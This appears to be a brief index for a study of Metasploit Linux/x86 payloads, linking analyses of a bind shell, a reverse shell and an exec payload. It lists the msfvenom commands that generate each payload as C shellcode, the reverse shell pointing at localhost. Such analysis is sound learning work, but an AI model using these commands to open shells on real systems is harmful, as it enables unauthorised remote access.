### MSF Payloads Analysis ##

I decided to divide the analysis into three parts due to the extensive descriptions and explanations.

- [Linux/x86 TCP Bind Shell](Bind-Shell)
```sh
$ msfvenom -p linux/x86/shell_bind_tcp LPORT=1234 -f c
```
- [Linux/x86 TCP Reverse Shell](Reverse-Shell)
```sh
$ msfvenom -p linux/x86/shell_reverse_tcp LPORT=1234 LHOST=127.0.0.1 -f c
```
- [Linux/86 Exec](Exec)
```sh
$ msfvenom -p linux/x86/exec CMD=/bin/bash -f c
```
